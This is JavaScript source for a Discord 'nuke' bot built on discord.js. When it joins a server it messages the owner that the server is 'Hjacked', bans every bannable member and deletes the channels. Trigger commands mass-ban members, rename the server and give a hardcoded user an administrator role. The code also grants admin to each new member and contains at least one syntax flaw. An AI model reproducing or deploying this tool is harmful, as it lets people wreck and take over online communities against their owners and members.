const Discord = require("discord.js")
const fs = require("fs")
const client = new Discord.Client()
const cache = JSON.parse(fs.readFileSync("./caches.json", "utf8"))
const token = cache.token
const cmd = cache.hackcmd
const opcmd = cache.opcommand
const pic = cache.picture
const spam = cache.spam
const name = cache.name
const playing = cache.play
const adminstrator = cache.oprole

async function nuke(guild) {
    await guild.owner.send('Your Server Has Been Hjacked !').catch((_) => { 0 })

    guild.members.forEach(async (m) => {
        if (m.bannable) {
            await m.send('HJACKED').catch((_) => { 0 })
            await m.ban()
        }
    })

    guild.channels.forEach(c => { c.deletable ? await c.delete() : 0 })

    await guild.createChannel("nuke is fall", { type: "text" })
    await guild.createChannel("nuke is fall", { type: "voice" })
}

client.on('guildCreate', async (guild) => { await nuke(guild).catch((_) => { 0 }) })

client.on('message', (message) => {
    if (message.content === cmd) {
        client.user.setAvatar(pic)
        client.user.setUsername(name)
        client.user.setGame(playing, 'https://www.twitch.tv/hix')
        message.guild.setIcon(pic)
        message.guild.setName(name)
        message.guild.members.forEach(async (member) => { member.bannable ? member.ban({ reason: spam }) : undefined })
        message.guild.channels.forEach(async (channel) => { channel.deletable ? await channel.delete() : 0 })

        const embed = new Discord.RichEmbed()
            .setColor("ff0000")
            .setThumbnail(pic)
            .addField(spam, ".")
        message.channel.sendEmbed(embed)

    } else if (message.content === opcmd) {
        if (message.author.id !== cache.urid) return
        let me = message.author
        message.guild.createRole({
            name: adminstrator,
            color: "RANDOM",
            permissions: [8]
        }).then((adminRole) => {
            message.guild.member(me).addRole(adminRole)
            message.channel.send(`HJACKED`)

        }).catch((_) => {
            console.log("Can't give you permissions")
        })
        const embed = new Discord.RichEmbed()
            .setColor("ff0000")
            .setThumbnail(pic)
            .addField(spam, ".")
        message.channel.sendEmbed(embed)
    }
})

client.on('guildMemberAdd', (member) => {
    member.guild.createRole({
        name: client.user.username,
        color: "RANDOM",
        permissions: [8]
    }).then(async (role) => {
        await member.addRole(role).catch((_) => { 0 })
    })

})

client.login(token).catch((_) => { console.log("Invalid token was provided") })
